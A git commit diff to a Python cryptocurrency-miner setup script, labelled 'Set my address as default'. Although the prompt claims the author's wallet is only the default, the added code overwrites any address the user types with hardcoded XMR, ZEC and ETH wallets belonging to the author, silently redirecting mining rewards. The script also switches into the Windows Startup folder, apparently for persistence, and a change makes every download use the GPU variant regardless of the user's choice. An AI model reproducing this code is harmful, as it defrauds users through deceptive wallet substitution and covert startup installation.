7129c81c17cb3f4a8e002d6a882b6e384209beb4
SynneK1337 <276786@pw.edu.pl>
2018-02-06 15:41:16 +0100

    Set my address as default

--- main.py
+++ main.py
@@ -17,18 +17,24 @@ if coin == "ZEC" or coin == "XMR":
     method = input("CPU or GPU? ").upper()
     if method == "GPU":
         method = input("AMD or NVIDIA? ").upper()
-    filename = download(coin, method)
 
 elif coin == "ETH": # Ethereum can be mined only by GPU :(
-    filename = download(coin, "GPU") 
+    method = "GPU"
+
+filename = download(coin, "GPU") 
 
 unzip(filename)
-addr = input("Enter your %s address: " % coin)
-if coin == "ETH":
-    configure(coin, "GPU", get_architecture(), addr)
+addr = input("Enter your %s address (default is mine): " % coin)
+if addr != "":
+    if coin == "XMR":
+        addr = "47ohR8DEm9P5J3J5FMoPwF4DgErLx6oEg9oHvNWnjtwsGxkDJ81uNuy6NdpnJAfE4d3kTfCMJ5fafQvSBK5Hf81sMCUeMoJ"
 
-else:
-    configure(coin, method, get_architecture(), addr)
+    elif coin == "ZEC":
+        addr = "t1ajuT1f14mHVf7K2tXeXoenP2HVBF1z5oD"
+
+    elif coin == "ETH":
+        addr = "0x32f7C13e7cB292b8d21c8706Eb549EB77d4813A6"
+configure(coin, method, get_architecture(), addr)
 
 if os() == "Windows":
     chdir(r'C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' % getlogin())
